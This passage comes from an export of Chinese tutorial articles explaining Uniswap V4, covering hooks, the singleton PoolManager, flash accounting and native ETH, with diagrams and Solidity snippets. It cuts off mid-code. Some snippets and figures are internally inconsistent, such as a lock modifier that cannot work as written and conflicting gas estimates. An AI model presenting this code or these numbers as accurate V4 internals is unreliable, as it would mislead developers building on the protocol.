链上数据分析\n\n测试网络\n\nGoerli测试网\nSepolia测试网\n本地Foundry/Hardhat环境\n\n阅读建议\n\n动手实践：每篇文章的代码示例都可以在测试网验证\n对照源码：建议同时阅读官方合约源码\n画图理解：复杂概念建议自己画图梳理\n循序渐进：不要跳过基础篇直接看进阶内容\n\n更新日志\n\n2024-01：系列文章完成\n\n反馈与交流\n如有问题或建议，欢迎通过Issue讨论。\n\nHappy Learning! 🚀"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/01-V4概述与架构革命":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/01-V4概述与架构革命","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/01-V4概述与架构革命.md","title":"01-V4概述与架构革命","links":[],"tags":[],"content":"死磕Uniswap V4（一）：概述与架构革命\n\n本文是「死磕Uniswap V4」系列的第一篇，将深入探讨V4相比V3的革命性架构创新。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4概述与架构革命Singleton、Hooks、Flash Accounting02Hooks机制深度解析Hook接口、生命周期、实现模式03单例架构与瞬时会计PoolManager、Currency、Accounting04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析05费用系统与动态费率自定义费率、动态调整、费用分配06账户抽象与原生ETHCurrency类型、settle/take、批量操作07安全分析与最佳实践Hook安全、MEV防护、审计要点\n\n1. 从V3到V4：一次架构革命\nUniswap V4于2023年6月发布，标志着AMM协议从”固定功能”向”可编程金融基础设施”的重大转变。这次升级不是简单的功能增加，而是从根本上重新设计了AMM的核心架构。\n1.1 V3的局限性分析\n在深入V4之前，让我们先理解V3面临的根本性限制：\ngraph TB\n    subgraph V3Limitations[&quot;V3架构局限性&quot;]\n        A1[每池独立部署]\n        A2[固定费率等级]\n        A3[WETH包装成本]\n        A4[无扩展能力]\n    end\n\n    subgraph Consequences[&quot;导致的后果&quot;]\n        C1[部署成本高昂&lt;br/&gt;~$500+/池]\n        C2[灵活性不足&lt;br/&gt;无法适应市场]\n        C3[Gas消耗高&lt;br/&gt;多跳交易贵]\n        C4[功能固化&lt;br/&gt;需要新版本]\n    end\n\n    A1 --&gt; C1\n    A2 --&gt; C2\n    A3 --&gt; C3\n    A4 --&gt; C4\n\n    style C1 fill:#ffcdd2\n    style C2 fill:#ffcdd2\n    style C3 fill:#ffcdd2\n    style C4 fill:#ffcdd2\n\n具体问题分析：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n局限性V3现状实际影响部署成本每池需CREATE2部署长尾资产无法承担启动成本费率僵化仅4个固定档位稳定币和高波动资产被迫使用相同费率ETH包装必须使用WETH每笔交易额外2次转账功能封闭无法自定义逻辑新需求需要等待V5\n1.2 V4的三大核心创新\nV4通过三项核心创新彻底改变了AMM的设计范式：\ngraph TB\n    subgraph V4Core[&quot;V4三大核心创新&quot;]\n        H[Hooks&lt;br/&gt;可编程钩子]\n        S[Singleton&lt;br/&gt;单例架构]\n        F[Flash Accounting&lt;br/&gt;瞬时会计]\n    end\n\n    subgraph Benefits[&quot;带来的优势&quot;]\n        B1[无限扩展性]\n        B2[大幅降低Gas]\n        B3[原生ETH支持]\n        B4[动态费率]\n        B5[低成本部署]\n    end\n\n    H --&gt; B1\n    H --&gt; B4\n    S --&gt; B2\n    S --&gt; B5\n    F --&gt; B2\n    F --&gt; B3\n\n    style H fill:#e3f2fd\n    style S fill:#c8e6c9\n    style F fill:#fff3e0\n\n\n2. Hooks：AMM的可编程革命\n2.1 什么是Hooks？\nHooks是V4最核心的创新，它允许开发者在池子生命周期的关键点插入自定义逻辑。这种设计使得Uniswap从一个”产品”转变为一个”平台”。\nflowchart LR\n    subgraph V3Mode[&quot;V3模式：固定流程&quot;]\n        U1[用户操作]\n        V3[V3 Core]\n        U2[固定结果]\n        U1 --&gt; V3 --&gt; U2\n    end\n\n    subgraph V4Mode[&quot;V4模式：可编程&quot;]\n        U3[用户操作]\n        V4[V4 Core]\n        H[Hook逻辑]\n        U4[可定制结果]\n        U3 --&gt; V4\n        V4 &lt;--&gt; H\n        V4 --&gt; U4\n    end\n\n    style H fill:#ffeb3b\n\n2.2 Hook生命周期\n一个完整的池子生命周期中有8个Hook触发点：\nstateDiagram-v2\n    [*] --&gt; Initialization: 创建池子\n    Initialization --&gt; Active: afterInitialize\n\n    Active --&gt; Modifying: 修改头寸\n    Active --&gt; Swapping: 执行交换\n    Active --&gt; Donating: 接受捐赠\n\n    Modifying --&gt; Active: afterModifyPosition\n    Swapping --&gt; Active: afterSwap\n    Donating --&gt; Active: afterDonate\n\n    note right of Modifying\n        beforeModifyPosition Hook\n        可用于：动态费用、条件限制\n    end note\n\n    note right of Swapping\n        beforeSwap Hook\n        可用于：MEV保护、定价逻辑\n    end note\n\n2.3 Hook接口定义\ninterface IHooks {\n    // 初始化Hooks\n    function beforeInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96, bytes calldata hookData)\n        external returns (bytes4);\n    function afterInitialize(address sender, PoolKey calldata key, uint160 sqrtPriceX96, bytes calldata hookData)\n        external returns (bytes4);\n \n    // 头寸修改Hooks\n    function beforeModifyPosition(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.ModifyPositionParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256 delta0, int256 delta1);\n    function afterModifyPosition(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.ModifyPositionParams calldata params,\n        BalanceDelta callerDelta,\n        bytes calldata hookData\n    ) external returns (bytes4);\n \n    // 交换Hooks\n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256 delta0, int256 delta1);\n    function afterSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        BalanceDelta callerDelta,\n        bytes calldata hookData\n    ) external returns (bytes4);\n \n    // 捐赠Hooks\n    function beforeDonate(\n        address sender,\n        PoolKey calldata key,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata hookData\n    ) external returns (bytes4);\n    function afterDonate(\n        address sender,\n        PoolKey calldata key,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata hookData\n    ) external returns (bytes4);\n}\n2.4 Hook应用场景\nHooks可以实现的创新用例：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHook类型应用场景实现效果动态费率Hook根据波动率调整费率高波动时高费率，低波动时低费率限价单Hook在特定价格自动执行无需订单簿的限价交易彩票Hook随机奖励流动性提供者增加LP趣味性和收益时间加权Hook根据持有时间奖励鼓励长期流动性预言机Hook自定义价格来源支持特殊定价逻辑\n动态费率Hook示例：\ncontract DynamicFeeHook is IHooks {\n    // 根据最近波动率计算动态费率\n    function beforeSwap(\n        address sender,\n        PoolKey calldata key,\n        IPoolManager.SwapParams calldata params,\n        bytes calldata hookData\n    ) external returns (bytes4, int256, int256) {\n        // 计算最近1小时的波动率\n        uint256 volatility = _calculateVolatility(key);\n \n        // 动态调整费率（基准1000 + 波动率调整）\n        uint16 dynamicFee = 1000 + uint16(volatility / 1e14);\n \n        // 更新池子的Hook费率\n        IPoolManager(poolManager).setHookFee(key.poolId, dynamicFee);\n \n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n \n    function _calculateVolatility(PoolKey calldata key) private view returns (uint256) {\n        // 实现波动率计算逻辑\n        // ...\n    }\n}\n\n3. Singleton：从多合约到单例\n3.1 架构转变\nV3中，每个交易对都是一个独立部署的合约。V4通过Singleton模式将所有池子集中到一个合约中。\ngraph TB\n    subgraph V3Architecture[&quot;V3架构：多合约模式&quot;]\n        Factory[UniswapV3Factory]\n        Pool1[Pool ETH/USDC]\n        Pool2[Pool ETH/USDT]\n        Pool3[Pool WBTC/ETH]\n        PoolN[Pool ...]\n\n        Factory --&gt; Pool1\n        Factory --&gt; Pool2\n        Factory --&gt; Pool3\n        Factory --&gt; PoolN\n    end\n\n    subgraph V4Architecture[&quot;V4架构：单例模式&quot;]\n        Manager[PoolManager]\n        State1[State ETH/USDC]\n        State2[State ETH/USDT]\n        State3[State WBTC/ETH]\n        StateN[State ...]\n\n        Manager --&gt; State1\n        Manager --&gt; State2\n        Manager --&gt; State3\n        Manager --&gt; StateN\n    end\n\n    style Manager fill:#c8e6c9\n\n3.2 PoolManager核心数据结构\ncontract PoolManager is IPoolManager, IHooks, ERC1155Holder {\n    // ========== 核心存储 ==========\n \n    // 池子状态（使用poolId索引）\n    mapping(bytes32 poolId =&gt; Pool.State) public pools;\n \n    // 池子的Slot0数据（tick、价格等）\n    mapping(bytes32 poolId =&gt; Pool.Slot0) public slot0s;\n \n    // Tick间距配置\n    mapping(bytes32 poolId =&gt; int24) public tickSpacings;\n \n    // 费用配置\n    mapping(bytes32 poolId =&gt; Pool.Fees) public fees;\n \n    // 协议费用\n    mapping(bytes32 poolId =&gt; ProtocolFees) public protocolFees;\n \n    // Hook地址\n    mapping(bytes32 poolId =&gt; IHooks) public hooks;\n \n    // ========== 瞬时会计系统 ==========\n \n    // 账户差额记录\n    mapping(address account =&gt; mapping(Currency currency =&gt; int256)) public deltas;\n \n    // 锁定状态\n    uint256 private locked = 1;\n \n    // ========== 货币系统 ==========\n \n    // Currency =&gt; 地址映射（原生ETH为address(0)）\n    mapping(Currency =&gt; address) public currencyAddresses;\n}\n \n// Pool状态结构\nlibrary Pool {\n    // 池子状态\n    struct State {\n        uint128 liquidity;          // 当前活跃流动性\n        uint128 liquidityNext;      // 下一个tick的流动性\n        Slot0 slot0;\n        Fees fees;\n    }\n \n    // Slot0结构\n    struct Slot0 {\n        uint160 sqrtPriceX96;       // 当前价格（平方根）\n        int24 tick;                 // 当前tick\n        uint24 observationIndex;    // 预言机索引\n        uint24 protocolFee;         // 协议费率\n        uint8 unlocked;             // 锁定状态\n    }\n \n    // 费用结构\n    struct Fees {\n        uint16 fee;                 // 基础费率\n        uint16 hookFee;             // Hook控制的费率\n    }\n}\n3.3 Pool标识符设计\nV4使用PoolKey作为池子的唯一标识：\n// PoolKey结构\nstruct PoolKey {\n    Currency currency0;         // Token0（或ETH）\n    Currency currency1;         // Token1（或ETH）\n    uint24 fee;                 // 基础费率\n    int24 tickSpacing;          // Tick间距\n    IHooks hooks;               // Hook合约地址\n}\n \n// PoolId计算（唯一标识符）\nbytes32 poolId = keccak256(abi.encode(key));\n为什么不再使用合约地址？\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方面V3（合约地址）V4（PoolId）标识方式合约地址keccak256(PoolKey)部署成本CREATE2 (~100k gas)纯计算，无gas查询效率需要外部调用mapping直接访问存储位置独立合约单合约mapping\n3.4 Gas节省分析\nflowchart LR\n    subgraph GasCost[&quot;Gas成本对比（部署新池）&quot;]\n        V3[&quot;V3: ~100,000 gas&lt;br/&gt;CREATE2部署&quot;]\n        V4[&quot;V4: ~0 gas&lt;br/&gt;仅存储写入&quot;]\n    end\n\n    subgraph Savings[&quot;节省来源&quot;]\n        S1[&quot;无需CREATE2&quot;]\n        S2[&quot;共享代码逻辑&quot;]\n        S3[&quot;批量操作优化&quot;]\n    end\n\n    V3 -.-&gt;|降低| V4\n    V4 --&gt; S1\n    V4 --&gt; S2\n    V4 --&gt; S3\n\n    style V4 fill:#c8e6c9\n\n量化分析：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作V3 GasV4 Gas节省创建新池~100,000~5,00095%跨池交换按跳数累加单次调用30-40%ETH交易额外包装成本原生支持~10k状态读取外部调用本地mapping2,600\n\n4. Flash Accounting：延迟转账的艺术\n4.1 传统会计 vs 瞬时会计\nsequenceDiagram\n    participant User\n    participant V3 as V3 Pool\n    participant Token\n\n    Note over User,Token: V3即时转账模式\n    User-&gt;&gt;V3: swap(amountIn)\n    V3-&gt;&gt;V3: 计算amountOut\n    V3-&gt;&gt;Token: transfer(tokenOut, user, amountOut)\n    V3-&gt;&gt;User: uniswapV3SwapCallback()\n    User-&gt;&gt;Token: transfer(tokenIn, pool, amountIn)\n    V3-&gt;&gt;V3: 验证余额\n\n    User-&gt;&gt;User: =====================\n    User-&gt;&gt;User: =====================\n\n    Note over User,Token: V4瞬时会计模式\n    User-&gt;&gt;V4: swap(amountIn)\n    V4-&gt;&gt;V4: deltas[user][tokenOut] += amountOut\n    V4-&gt;&gt;V4: deltas[user][tokenIn] -= amountIn\n    V4-&gt;&gt;User: 返回结果\n    User-&gt;&gt;V4: settle(tokenIn, amountIn)\n    User-&gt;&gt;V4: take(tokenOut, amountOut)\n    V4-&gt;&gt;V4: unlock()时验证并结算\n\n4.2 瞬时会计核心概念\n核心思想： 在交易过程中只记录”应该发生的金额变化”，而不实际执行转账，在交易结束时统一结算。\n// 账户差额记录\nmapping(address account =&gt; mapping(Currency currency =&gt; int256)) public deltas;\n \n// 正数 = 应该收取的金额\n// 负数 = 应该支付的金额\n4.3 settle() 和 take() 函数\n// 用户支付金额\nfunction settle(Currency currency, uint256 amount) external {\n    require(locked, &quot;Not locked&quot;);\n \n    // 记录用户需要支付的金额（负数）\n    deltas[msg.sender][currency] -= int256(amount);\n \n    if (currency.isNative()) {\n        // 对于ETH，直接检查msg.value\n        require(msg.value &gt;= amount, &quot;Insufficient ETH&quot;);\n    }\n    // 对于ERC20，在unlock时统一transferFrom\n}\n \n// 用户收取金额\nfunction take(Currency currency, address recipient, uint256 amount) external {\n    require(locked, &quot;Not locked&quot;);\n \n    // 记录用户应该收到的金额（正数）\n    deltas[recipient][currency] += int256(amount);\n}\n \n// 结算所有差额\nfunction _accountingBalance() internal {\n    for (uint256 i = 0; i &lt; currencies.length; i++) {\n        Currency currency = currencies[i];\n        int256 delta = deltas[msg.sender][currency];\n \n        if (delta &gt; 0) {\n            // 用户应该收款\n            if (currency.isNative()) {\n                payable(msg.sender).transfer(uint256(delta));\n            } else {\n                ERC20(currency.address()).transfer(msg.sender, uint256(delta));\n            }\n        } else if (delta &lt; 0) {\n            // 用户应该付款\n            uint256 amount = uint256(-delta);\n            if (!currency.isNative()) {\n                ERC20(currency.address()).transferFrom(msg.sender, address(this), amount);\n            }\n            // ETH在settle时已经验证msg.value\n        }\n \n        // 清零差额\n        deltas[msg.sender][currency] = 0;\n    }\n}\n4.4 安全性保障\n问题： 如果用户记录了差额但不结算怎么办？\n解决方案：\n\nNonce机制\n\nmapping(address =&gt; uint256) public nonces;\n \nfunction _checkNonce() internal {\n    uint256 expectedNonce = nonces[msg.sender] + 1;\n    require(nonce == expectedNonce, &quot;Invalid nonce&quot;);\n    nonces[msg.sender] = expectedNonce;\n}\n\n锁定验证\n\nmodifier lock() {\n    require(locked == 0, &quot;Already locked&quot;);\n    locked = 1;\n    _;\n    locked = 0;\n \n    // unlock时验证所有差额已结算\n    _verifyDeltasSettled();\n}\n\n资金惩罚\n\n// 如果unlock时差额未结算，扣除保证金或惩罚\n\n5. Native ETH：告别WETH\n5.1 Currency类型设计\nV4引入Currency类型统一处理ETH和ERC20：\ntype Currency is address;\n \nlibrary CurrencyLibrary {\n    Currency internal constant NATIVE = Currency.wrap(address(0));\n \n    function isNative(Currency currency) internal pure returns (bool) {\n        return Currency.unwrap(currency) == address(0);\n    }\n \n    function toId(Currency currency) internal pure returns (uint256) {\n        return uint256(Currency.unwrap(currency));\n    }\n \n    function fromId(uint256 id) internal pure returns (Currency) {\n        return Currency.wrap(address(id));\n    }\n}\n5.2 ETH处理流程\nflowchart TD\n    A[用户发起swap] --&gt; B{Currency0/1&lt;br/&gt;是否为Native?}\n    B --&gt;|是| C[接收msg.value]\n    B --&gt;|否| D[处理ERC20]\n\n    C --&gt; E[记录deltas&lt;br/&gt;无需WETH包装]\n    D --&gt; E\n\n    E --&gt; F[执行swap逻辑]\n    F --&gt; G[结算时&lt;br/&gt;ETH直接send]\n\n    style C fill:#c8e6c9\n    style G fill:#c8e6c9\n\n5.3 Gas节省对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作V3 (WETH)V4 (Native)节省ETH包装~40,0000100%ETH解包~40,0000100%授权检查~5,0000100%单笔交易~85,000~45,000~47%\n\n6. 其他重要特性\n6.1 自定义费用曲线\nV4通过Hooks可以实现任意费用模型：\n// 示例：基于交易量的阶梯费率\ncontract VolumeBasedFeeHook {\n    function beforeSwap(...) external returns (bytes4, int256, int256) {\n        uint256 volume = getRecentVolume(poolId);\n \n        uint16 fee;\n        if (volume &lt; 100000e6) {\n            fee = 500;      // 0.05%\n        } else if (volume &lt; 1000000e6) {\n            fee = 3000;     // 0.3%\n        } else {\n            fee = 10000;    // 1%\n        }\n \n        poolManager.setHookFee(poolId, fee - baseFee);\n        return (IHooks.beforeSwap.selector, 0, 0);\n    }\n}\n6.2 EIP-1155 LP代币（可选）\nV4支持使用EIP-1155标准的LP代币：\n// 1155标准允许同质化和非同质化代币共存\n// 每个头寸可以是一个独立的token ID\ncontract LPMirror is ERC1155 {\n    function mint(uint256 id, uint256 amount) external {\n        // id = keccak256(abi.encode(poolKey, tickLower, tickUpper))\n        _mint(msg.sender, id, amount, &quot;&quot;);\n    }\n}\n6.3 更低的创建成本\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n成本项目V3V4说明Pool部署100-5001-5无需独立合约Hook部署-20-50一次性成本初始流动性同V3同V3无变化总启动成本$500+~$50降低90%\n\n7. V3 vs V4 完整对比\n7.1 架构对比\ngraph TB\n    subgraph V3Stack[&quot;V3技术栈&quot;]\n        V3Core[UniswapV3Pool]\n        V3Factory[UniswapV3Factory]\n        V3Router[SwapRouter]\n        V3NFT[PositionManager]\n    end\n\n    subgraph V4Stack[&quot;V4技术栈&quot;]\n        V4Manager[PoolManager]\n        V4Router[SwapRouter]\n        V4Hook[Hook Contracts]\n        V4Mirror[LPMirror]\n    end\n\n    V3Factory --&gt; V3Core\n    V3Router --&gt; V3Core\n    V3NFT -.-&gt;V3Core\n\n    V4Router --&gt; V4Manager\n    V4Hook &lt;--&gt; V4Manager\n    V4Mirror --&gt; V4Manager\n\n    style V4Manager fill:#e3f2fd\n\n7.2 功能对比表\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性V3V4改进架构每池一合约单例模式部署成本↓95%扩展性固定功能Hooks可编程无限可能费率4个固定档位任意动态费率精细化定价ETH支持需要WETH原生支持Gas↓47%转账即时转账瞬时会计批量操作优化LP代币ERC721 NFTERC1155可选更灵活Gas效率基准降低30-40%成本显著降低创建池Factory CREATE2纯存储写入接近零成本\n7.3 适用场景\nV3更适合：\n\n简单的流动性提供\n标准交易对\n不需要特殊逻辑\n\nV4更适合：\n\n需要自定义费用模型\n复杂的交易逻辑\n成本敏感的长尾资产\n需要原生ETH支持\n创新金融产品\n\n\n8. 本章小结\n8.1 V4核心创新总结\nmindmap\n  root((Uniswap V4&lt;br/&gt;核心创新))\n    Hooks\n      可编程性\n      8个生命周期点\n      无限扩展可能\n    Singleton\n      单例架构\n      统一状态管理\n      部署成本降低95%\n    Flash Accounting\n      延迟转账\n      差额记录\n      批量操作优化\n    Native ETH\n      无需WETH\n      统一抽象\n      Gas节省47%\n    动态费用\n      任意费率\n      实时调整\n      精细化定价\n\n8.2 关键概念回顾\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n概念定义重要性Hooks池子生命周期的可编程插入点V4的核心创新Singleton所有池子共享一个合约降低部署成本PoolKey池子的唯一标识符替代合约地址CurrencyETH/ERC20的统一抽象原生ETH支持settle/take瞬时会计的结算函数延迟转账机制deltas账户差额记录会计系统核心\n8.3 设计哲学\nV4体现了几个重要的设计哲学：\n\n可组合性优先 - Hooks使得任何人都可以扩展功能\nGas效率 - Singleton和Flash Accounting大幅降低成本\n开发者友好 - 统一的Currency抽象，简化开发\n渐进式升级 - Hooks允许无需V5即可创新\n\n\n下一篇预告\n在下一篇文章中，我们将深入探讨Hooks机制，包括：\n\n每个Hook函数的详细参数和返回值\nHook执行顺序和时序\n常见Hook实现模式\nHook开发最佳实践\n安全考虑和常见陷阱\n\n\n参考资料\n\nUniswap V4 白皮书\nUniswap V4 Core 源码\nUniswap V4 Hooks 文档\nEIP-1155: Multi Token Standard\n"},"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/02-Hooks机制深度解析":{"slug":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/02-Hooks机制深度解析","filePath":"blockchainguide/DApp_Development/应用场景/defi/uniswap/v4/02-Hooks机制深度解析.md","title":"02-Hooks机制深度解析","links":[],"tags":[],"content":"死磕Uniswap V4（二）：Hooks机制深度解析\n\n本文是「死磕Uniswap V4」系列的第二篇，深入剖析V4最核心的创新——Hooks（钩子）机制。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01V4概述与架构革命Singleton、Hooks、Flash Accounting02Hooks机制深度解析Hook接口、生命周期、实现模式03单例架构与瞬时会计PoolManager、Currency、Accounting04交换流程与Hook执行时序swap函数、Hook调用链、Gas分析05费用系统与动态费率自定义费率、动态调整、费用分配06账户抽象与原生ETHCurrency类型、settle/take、批量操作07安全分析与最佳实践Hook安全、MEV防护、审计要点\n\n1. Hooks设计理念\n1.1 为什么需要Hooks？\n在传统的智能合约设计中，如果要扩展功能，通常需要：\n\n升级合约（复杂且危险）\n部署新版本（导致流动性碎片化）\n使用代理模式（增加复杂度和Gas）\n\nHooks提供了一种非侵入式的扩展机制：\ngraph LR\n    subgraph Traditional[&quot;传统模式&quot;]\n        A[核心合约] --&gt; B[硬编码功能]\n        B --&gt; C[修改需要升级]\n    end\n\n    subgraph HookMode[&quot;Hooks模式&quot;]\n        D[核心合约] --&gt; E[Hook调用点]\n        E --&gt; F[用户自定义逻辑]\n        F --&gt; G[任意扩展无需升级]\n    end\n\n    style F fill:#c8e6c9\n\n1.2 Hooks的设计原则\nUniswap V4的Hooks设计遵循以下原则：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n原则说明实现方式非侵入性核心逻辑不依赖HookHook失败不影响核心流程可选性每个Hook都是可选的返回0x0表示未实现权限控制只有授权地址可以调用Hook验证msg.senderGas效率Hook调用成本最小化静态调用，无额外delegatecall可组合性Hook可以调用其他合约支持复杂逻辑\n1.3 Hook与核心合约的关系\n// PoolManager中的Hook调用\ncontract PoolManager {\n    IHooks public immutable hooks;\n \n    function _callBeforeSwap(\n        PoolKey calldata key,\n        SwapParams calldata params\n    ) internal returns (int256 delta0, int256 delta1) {\n        if (address(key.hooks) == address(0)) return (0, 0);\n \n        // 检查Hook是否实现了beforeSwap\n        if (!_isHookImplemented(key.hooks, beforeSwapSelector)) {\n            return (0, 0);\n        }\n \n        // 静态调用Hook\n        (bytes4 selector, int256 hookDelta0, int256 hookDelta1) =\n            key.hooks.beforeSwap(msg.sender, key, params, params.hookData);\n \n        // 验证返回的selector\n        require(selector == IHooks.beforeSwap.selector, &quot;Invalid hook return&quot;);\n \n        return (hookDelta0, hookDelta1);\n    }\n}\n\n2. Hook接口详解\n2.1 Hook函数概览\nV4定义了8个Hook函数，覆盖池子的完整生命周期：\nflowchart TB\n    subgraph Lifecycle[&quot;池子生命周期&quot;]\n        Init[初始化]\n        Position[头寸管理]\n        Swap[交易]\n        Donate[捐赠]\n    end\n\n    subgraph Hooks[&quot;Hook函数&quot;]\n        H1[before/afterInitialize]\n        H2[before/afterModifyPosition]\n        H3[before/afterSwap]\n        H4[before/afterDonate]\n    end\n\n    Init --&gt; H1\n    Position --&gt; H2\n    Swap --&gt; H3\n    Donate --&gt; H4\n\n    style Hooks fill:#e3f2fd\n\n2.2 初始化Hooks\nbeforeInitialize\n在池子初始化之前调用，可用于：\n\n验证初始化参数\n自定义初始价格\n设置Hook内部状态\n\nfunction beforeInitialize(\n    address sender,\n    PoolKey calldata key,\n    uint160 sqrtPriceX96,\n    bytes calldata hookData\n) external returns (bytes4) {\n    // 验证参数\n    require(sqrtPriceX96 &gt;= TickMath.MIN_SQRT_RATIO, &quot;Price too low&quot;);\n    require(sqrtPriceX96 &lt;= TickMath.MAX_SQRT_RATIO, &quot;Price too high&quot;);\n \n    // 自定义初始价格（可选）\n    // uint160 customPrice = _calculateCustomPrice(key, hookData);\n \n    // 设置Hook内部状态\n    _initializePoolState(key);\n \n    return (IHooks.beforeInitialize.selector);\n}\nafterInitialize\n在池子初始化之后调用，可用于：\n\n记录初始化事件\n触发后续操作\n与其他协议交互\n\nfunction afterInitialize(\n    address sender,\n    PoolKey calldata key,\n    uint160 sqrtPriceX96,\n    bytes calldata hookData\n) external returns (bytes4) {\n    // 记录初始化事件\n    emit PoolInitialized(key.poolId, sqrtPriceX96, block.timestamp);\n \n    // 启动定时任务（如定期再平衡）\n    _scheduleRebalance(key);\n \n    return (IHooks.afterInitialize.selector);\n}\n2.3 头寸管理Hooks\nbeforeModifyPosition\n在修改流动性头寸之前调用，这是最强大的Hook之一：\nfunction beforeModifyPosition(\n    address sender,\n    PoolKey calldata key,\n    IPoolManager.ModifyPositionParams calldata params,\n    bytes calldata hookData\n) external returns (bytes4, int256 delta0, int256 delta1) {\n    // params包含:\n    // - int24 tickLower: 下界tick\n    // - int24 tickUpper: 上界tick\n    // - int128 liquidityDelta: 流动性变化量\n \n    // 应用场景1: 动态费用\n    // 根据头寸位置动态调整费率\n    if (params.liquidityDelta &gt; 0) {\n        // 增加流动性时收取一次性费用\n        uint256 fee = _calculateEntryFee(key, params);\n        if (fee &gt; 0) {\n            (uint128 amount0, uint128 amount1) = _getFeeAmounts(key, fee);\n            delta0 = int256(amount0);\n            delta1 = int256(amount1);\n        }\n    }\n \n    // 应用场景2: 条件限制\n    // 限制只能在特定价格区间内添加流动性\n    (uint160 currentPrice, , ,) = poolManager.slot0s(key.poolId);\n    if (!_isAllowedRange(currentPrice, params.tickLower, params.tickUpper)) {\n        revert(&quot;Range not allowed&quot;);\n    }\n \n    // 应用场景3: 收益复投\n    // 自动将已赚取的费用复投到新流动性中\n    if (_shouldCompound(sender)) {\n        _compoundFees(sender, key);\n    }\n \n    return (IHooks.beforeModifyPosition.selector, delta0, delta1);\n}\n返回值说明：\n\ndelta0/delta1: Hook可以从用户收取额外费用（正数=用户付给Hook）\n\nafterModifyPosition\n在修改头寸之后调用：\nfunction afterModifyPosition(\n    address sender,\n    PoolKey calldata key,\n    IPoolManager.ModifyPositionParams calldata params,\n    BalanceDelta callerDelta,\n    bytes calldata hookData\n) external returns (bytes4) {\n    // callerDelta: 实际发生的代币变化\n \n    // 应用场景1: 费用分配\n    if (params.liquidityDelta &gt; 0) {\n        _distributeProtocolFee(key, callerDelta);\n    }\n \n    // 应用场景2: 奖励计算\n    // 记录流动性贡献，用于后续奖励分配\n    _trackLiquidityContribution(sender, key, params);\n \n    // 应用场景3: 动态NFT属性\n    // 根据头寸大小更新NFT元数据\n    _updatePositionMetadata(sender, key, params);\n \n    return (IHooks.afterModifyPosition.selector);\n}\n2.4 交换Hooks\nbeforeSwap\n在执行交换之前调用，这是最常用的Hook：\nfunction beforeSwap(\n    address sender,\n    PoolKey calldata key,\n    IPoolManager.SwapParams calldata params,\n    bytes calldata hookData\n) external returns (bytes4, int256 delta0, int256 delta1) {\n    // params包含:\n    // - bool zeroForOne: 交换方向\n    // - int256 amountSpecified: 指定数量（正=输入，负=输出）\n    // - uint160 sqrtPriceLimitX96: 价格限制\n \n    // ========== 应用场景 ==========\n \n    // 场景1: 动态费率\n    uint256 volatility = _calculateVolatility(key);\n    uint16 dynamicFee = _getDynamicFee(volatility);\n    poolManager.setHookFee(key.poolId, dynamicFee);\n \n    // 场景2: MEV保护\n    if (_isSuspiciousTransaction(sender, params)) {\n        // 限制交易规模或增加费率\n        _applyMevProtection(key, params);\n    }\n \n    // 场景3: 限价订单\n    if (_isLimitOrder(hookData)) {\n        _handleLimitOrder(sender, key, params, hookData);\n    }\n \n    // 场景4: 自定义定价\n    // Hook可以自定义swap的计算逻辑\n    (int256 customDelta0, int256 customDelta1) =\n        _calculateCustomSwap(key, params);\n \n    return (IHooks.beforeSwap.selector, customDelta0, customDelta1);\n}\n关键点：\n\ndelta0/delta1 可以自定义交换的实际数量\n返回 (0, 0) 表示使用默认计算\n返回非零值会覆盖默认计算结果\n\nafterSwap\n在交换完成后调用：\nfunction afterSwap(\n    address sender,\n    PoolKey calldata key,\n    IPoolManager.SwapParams calldata params,\n    BalanceDelta callerDelta,\n    bytes calldata hookData\n) external returns (bytes4) {\n    // callerDelta: 实际发生的代币变化\n \n    // 应用场景1: 费用分配\n    uint256 hookFee = _calculateHookFee(key, callerDelta);\n    if (hookFee &gt; 0) {\n        _collectHookFee(sender, key, hookFee);\n    }\n \n    // 应用场景2: 交易追踪\n    _updateTradingVolume(sender, key, callerDelta);\n \n    // 应用场景3: 奖励分配\n    // 向流动性提供者分配交易费用\n    if 